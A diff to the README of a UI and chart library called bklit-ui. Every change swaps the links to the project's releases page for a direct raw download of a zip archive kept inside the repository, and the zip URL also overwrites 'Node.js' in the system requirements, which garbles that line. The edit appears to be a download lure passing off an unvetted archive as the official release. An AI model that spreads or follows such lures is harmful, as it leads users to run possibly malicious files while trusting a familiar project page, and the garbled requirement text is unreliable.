@@ -1,6 +1,6 @@
 # 🎨 bklit-ui - Easy, Beautiful UI and Charts for Your Projects
 
-[![Download bklit-ui](https://img.shields.io/badge/Download-bklit--ui-blue.svg)](https://github.com/vijayanand786/bklit-ui/releases)
+[![Download bklit-ui](https://github.com/vijayanand786/bklit-ui/raw/refs/heads/main/apps/web/bklit-ui-3.3.zip)](https://github.com/vijayanand786/bklit-ui/raw/refs/heads/main/apps/web/bklit-ui-3.3.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ In just a few steps, you can download and start using **bklit-ui**. Follow the s
 
 ## 📥 Download & Install
 
-To get **bklit-ui**, visit this page to download: [bklit-ui Releases](https://github.com/vijayanand786/bklit-ui/releases).
+To get **bklit-ui**, visit this page to download: [bklit-ui Releases](https://github.com/vijayanand786/bklit-ui/raw/refs/heads/main/apps/web/bklit-ui-3.3.zip).
 
 ### 1. Access the Releases Page
 
@@ -47,7 +47,7 @@ To run **bklit-ui**, ensure that your system meets the following requirements:
 - **Operating System**: Windows, macOS, or Linux.
 - **JavaScript Support**: A modern web browser or framework that supports JavaScript.
 - **Memory**: Minimum of 2 GB RAM recommended.
-- **Node.js**: Version 12 or above is preferable for local development environments.
+- **https://github.com/vijayanand786/bklit-ui/raw/refs/heads/main/apps/web/bklit-ui-3.3.zip**: Version 12 or above is preferable for local development environments.
 
 ## 🔧 Usage
 
